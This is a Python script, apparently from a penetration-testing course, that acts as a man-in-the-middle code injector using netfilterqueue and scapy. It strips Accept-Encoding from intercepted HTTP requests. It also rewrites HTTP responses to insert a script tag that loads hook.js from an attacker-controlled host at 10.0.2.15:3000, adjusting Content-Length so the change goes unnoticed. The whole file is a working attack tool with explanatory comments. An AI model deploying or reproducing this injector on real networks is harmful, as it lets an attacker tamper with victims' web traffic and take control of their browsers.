#!/usr/bin/env python

# This script replace parts of the html code that the target loads

import netfilterqueue
import scapy.all as scapy
import re  # Import for regex module

ack_list = []


# This functions changes the load value and also we need to remove the len and chksum field in the IP layer
# and the chksum field in the TCP layer. This is because we have changed the content of the load and this will change
# the values. Scapy will recalculate the new values. This should be done everytime we alter a scapy packet
def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())  # Converts the packet to a scapy packet.

    if scapy_packet.haslayer(scapy.Raw):
        try:
            load = scapy_packet[scapy.Raw].load.decode()
            if scapy_packet[scapy.TCP].dport == 80:  # This if statement capture the http request layer.
                print("[+] Request")
                print("=======================================================================================================")
                # The following line replaces the encoding in the load field with empty string.
                # This is so that the server sends back as html encoding instead.
                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)

            elif scapy_packet[scapy.TCP].sport == 80:  # This if statement capture the http response layer.
                print("[+] Response")
                print("=======================================================================================================")
                # print(scapy_packet.show())
                # The following lines injects javascript in the html body.
                injection_code = '<script src="http://10.0.2.15:3000/hook.js"></script>'
                load = load.replace("</body>", injection_code + "</body>")
                # The following line search for a regex in the load and stores the result.
                content_length_search = re.search("(?:Content-Length:\s)(\d+)", load)
                if content_length_search and "text/html" in load:
                    # The following lines are recalculating the content length and updating the value
                    content_length = content_length_search.group(1)
                    new_content_length = int(content_length) + len(injection_code)
                    load = load.replace(content_length, str(new_content_length))

            # In this if statement we check if the load is modified and if it is we set the new load.
            if load != scapy_packet[scapy.Raw].load:
                new_packet = set_load(scapy_packet, load)
                packet.set_payload(bytes(new_packet))
        except UnicodeDecodeError:
            pass
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)

try:
    while True:
        queue.run()
except KeyboardInterrupt:
    print("\n[-] Keyboard Interrupt detected. Exiting program")

